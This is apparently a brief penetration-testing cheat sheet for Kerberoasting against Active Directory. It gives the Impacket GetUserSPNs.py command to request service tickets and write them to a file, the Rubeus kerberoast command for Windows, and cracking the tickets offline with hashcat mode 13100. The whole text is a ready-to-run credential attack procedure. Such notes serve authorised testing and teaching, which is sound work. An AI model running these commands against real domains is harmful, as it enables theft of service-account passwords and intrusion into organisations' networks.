    From Linux

    1. Use Impacket's GetUserSPNs script: 

      GetUserSPNs.py -dc-ip "$DC_IP" -request -outputfile "$OUTFILE" "$DOMAIN/$USER"

    2. Crack with hashcat mode 13100

    From Windows

      .\Rubeus.exe kerberoast /nowrap

    2. Crack with hashcat mode 13100
